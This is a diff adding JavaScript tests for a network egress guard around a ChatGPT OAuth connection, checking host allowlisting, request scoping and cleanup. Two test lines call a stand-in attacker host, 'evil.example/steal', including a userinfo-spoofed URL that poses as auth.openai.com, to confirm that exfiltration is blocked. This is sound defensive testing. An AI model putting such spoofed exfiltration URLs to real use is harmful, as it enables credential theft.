@@ -54,7 +54,8 @@ async function fixture(fn, overrides = {}) {
   });
   const make = () => createChatGPTConnection({
     userData: root, encryption: secure, openBrowser,
-    startCallback, exchangeCode, fetchFn: overrides.fetchFn ?? (async () => { throw Error('unexpected remote request'); }),
+    startCallback, exchangeCode,
+    ...(overrides.withGuard ? {} : { fetchFn: overrides.fetchFn ?? (async () => { throw Error('unexpected remote request'); }) }),
   });
   try { return await fn({ root, make, listeners, visits, exchangeCalls, secure }); }
   finally { fs.rmSync(root, { recursive: true, force: true }); }
@@ -167,3 +168,127 @@ test('catalog format diagnostics reveal only a fixed reason, not remote response
     object: 'list', data: [{ id: 'private-catalog-response' }],
   }), { status: 200, headers: { 'content-type': 'application/json' } }),
 }));
+
+
+test('production ChatGPT fetch fails closed until bound to shared guarded egress and after cleanup', async () => {
+  await fixture(async ({ make }) => {
+    const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
+    const service = make();
+    assert.equal((await service.signIn()).status, 'connected');
+    assert.deepEqual(await service.models(), { ok: false, error: 'egress_blocked' });
+    const allowedHosts = new Set();
+    const calls = [];
+    const guard = createEgress({
+      allowHosts: () => allowedHosts,
+      fetch: async (url) => {
+        calls.push(url);
+        return new Response(JSON.stringify({ models: [
+          { slug: 'gpt-test', display_name: 'GPT Test', visibility: 'list' },
+        ] }), { status: 200, headers: { 'content-type': 'application/json' } });
+      },
+    });
+    const transport = {
+      fetch: guard.fetch,
+      stopped: guard.stopped,
+      widen(hosts) {
+        for (const host of hosts) allowedHosts.add(host);
+        return () => { for (const host of hosts) allowedHosts.delete(host); };
+      },
+    };
+    const detach = service.bindEgress(transport);
+    assert.deepEqual((await service.models()).models, [{ id: 'gpt-test', name: 'GPT Test' }]);
+    assert.deepEqual(calls, ['https://api.openai.com/v1/models']);
+    assert.equal(guard.ledger()[0].host, 'api.openai.com');
+    assert.equal(guard.ledger()[0].feature, 'unknown'); // the test guard uses a Set
+    assert.equal(allowedHosts.size, 0, 'network access is scoped to each request');
+    detach();
+    assert.equal(allowedHosts.size, 0, 'temporary allowlist entries are released');
+    const events = [];
+    for await (const event of service.streamResponse({
+      model: 'gpt-test', messages: [{ role: 'user', content: 'hello' }],
+    })) events.push(event);
+    assert.equal(events.at(-1).type, 'error');
+    assert.equal(calls.length, 1, 'no network request can escape after detach');
+    guard.uninstall();
+    assert.throws(() => service.bindEgress(transport), /Active guarded egress required/);
+  }, { withGuard: true });
+});
+
+test('guard refuses unrelated hosts even while ChatGPT is connected', async () => fixture(async ({ make }) => {
+  const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
+  const service = make();
+  const hosts = new Map();
+  const rawCalls = [];
+  const g = createEgress({ allowHosts: () => hosts, fetch: async url => {
+    rawCalls.push(url);
+    return new Response('{}', { status: 200 });
+  } });
+  const release = service.bindEgress({
+    fetch: g.fetch, stopped: g.stopped,
+    widen(list, feature) {
+      for (const host of list) hosts.set(host, feature);
+      return () => { for (const host of list) hosts.delete(host); };
+    },
+  });
+  await assert.rejects(g.fetch('https://evil.example/steal'),
+    err => err.cause?.code === 'EGRESS_BLOCKED');
+  assert.deepEqual(rawCalls, []);
+  assert.deepEqual([...hosts], [], 'the allowlist is not widened at rest');
+  assert.equal((await service.signIn()).status, 'connected');
+  const remote = service.models();
+  assert.equal((await remote).ok, false, 'dummy response is not a valid model catalog');
+  assert.deepEqual(rawCalls, ['https://api.openai.com/v1/models']);
+  assert.equal(hosts.size, 0, 'allowlist scopes end when requests complete');
+  assert.equal(g.ledger().find(entry => entry.host === 'api.openai.com')?.feature, 'chatgpt');
+  release();
+  assert.equal(hosts.size, 0);
+}, { withGuard: true }));
+
+
+test('OAuth token exchange uses the guarded and origin-pinned transport, never a forged host', async () => {
+  const called = [];
+  const hosts = new Map();
+  const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
+  const guard = createEgress({
+    allowHosts: () => hosts,
+    fetch: async (url) => {
+      called.push(url);
+      return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
+    },
+  });
+  let spoofRejected = false;
+  await fixture(async ({ make }) => {
+    const service = make();
+    const detach = service.bindEgress({
+      fetch: guard.fetch,
+      stopped: guard.stopped,
+      widen: (allowed, feature) => {
+        for (const host of allowed) hosts.set(host, feature);
+        return () => { for (const host of allowed) hosts.delete(host); };
+      },
+    });
+    const status = await service.signIn();
+    assert.equal(status.ok, true);
+    assert.equal(spoofRejected, true);
+    assert.deepEqual(called, ['https://auth.openai.com/api/accounts/oauth/token']);
+    assert.equal(guard.ledger().find(item => item.host === 'auth.openai.com').feature, 'chatgpt');
+    assert.equal(hosts.size, 0, 'scoped allowance does not outlive exchange');
+    detach();
+  }, {
+    withGuard: true,
+    exchangeCode: async ({ callback, fetchFn }) => {
+      await fetchFn('https://auth.openai.com/api/accounts/oauth/token', { method: 'POST', redirect: 'error' });
+      try {
+        await fetchFn('https://auth.openai.com@evil.example/steal', { method: 'POST' });
+      } catch (e) {
+        spoofRejected = e?.cause?.code === 'EGRESS_BLOCKED';
+      }
+      return {
+        identity: { subject: 'stable-user', clientId: callback.clientId },
+        scopes: ['openid', 'resource.invoke', 'chatgpt.tokens.use.direct'],
+        credentials: { accessToken: 'secret-access', refreshToken: 'secret-refresh',
+          idToken: 'private-id-token', expiresAt: Date.now() + 3600_000 },
+      };
+    },
+  });
+});
